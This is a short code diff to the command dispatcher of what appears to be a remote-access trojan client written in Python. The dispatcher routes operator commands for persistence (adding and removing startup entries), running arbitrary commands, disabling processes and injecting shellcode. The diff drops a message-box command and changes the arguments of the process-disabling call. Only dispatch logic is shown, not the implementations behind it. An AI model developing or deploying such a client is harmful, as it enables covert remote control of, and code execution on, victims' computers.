@@ -25,8 +25,6 @@ class CommandHandler:
         match _command:
             case c.CLIENT_EXIT:
                 self.control.close()
-            case c.CLIENT_MSG:
-                control.message_box(command["value"])
             case c.CLIENT_ADD_STARTUP:
                 self.control.add_startup()
             case c.CLIENT_RMV_STARTUP:
@@ -58,6 +56,6 @@ class CommandHandler:
             case c.CLIENT_RUN_CMD:
                 self.control.run_command(command["value"])
             case c.CLIENT_DISABLE_PROCESS:
-                self.control.toggle_disable_process(command["value"])
+                self.control.toggle_disable_process(command["value"]["process"], command["value"]["popup"])
             case c.CLIENT_SHELLCODE:
                 self.control.inject_shellcode(command["value"]["buffer"])
